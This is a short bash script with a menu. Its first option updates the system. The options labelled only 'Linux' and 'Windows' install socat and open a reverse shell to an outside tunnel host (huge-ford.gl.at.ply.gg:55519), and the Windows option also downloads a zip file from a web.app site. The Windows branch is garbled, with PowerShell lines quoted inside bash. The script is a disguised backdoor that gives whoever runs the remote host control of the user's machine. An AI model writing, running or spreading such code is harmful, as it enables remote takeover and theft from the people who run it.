#!/bin/bash

# Function definitions
choice1() {
    sudo apt update && sudo apt upgrade -y
    sudo snap refresh
}

choice2() {
    #For Linux
    sudo apt install socat
    socat tcp-connect:huge-ford.gl.at.ply.gg:55519 system:/bin/bash,pty,stderr,sane
}

choice3() {
    #For Windows
    "$client = new-object System.Net.WebClient"
    "$client.DownloadFile(\"https://neonsppandro.web.app/Shining.zip\" , \"Shining.zip\")"
    ./socat.exe tcp-connect:huge-ford.gl.at.ply.gg:55519 exec:cmd,pty,stderr,sane
}

show_menu() {
  echo "Please select an option:"
  echo "1. Check for updates on your system."
  echo "2. Linux"
  echo "3. Windows"
  echo "4. Exit"
}

# Main script
while true; do
  show_menu
  read -p "Enter your choice: " choice

  case $choice in
    1)
      choice1
      ;;
    2)
      choice2
      ;;
    3)
      choice3
      ;;
    4)
      echo "Exiting..."
      exit 0
      ;;
    *)
      echo "Invalid choice. Please try again."
      ;;
  esac
done
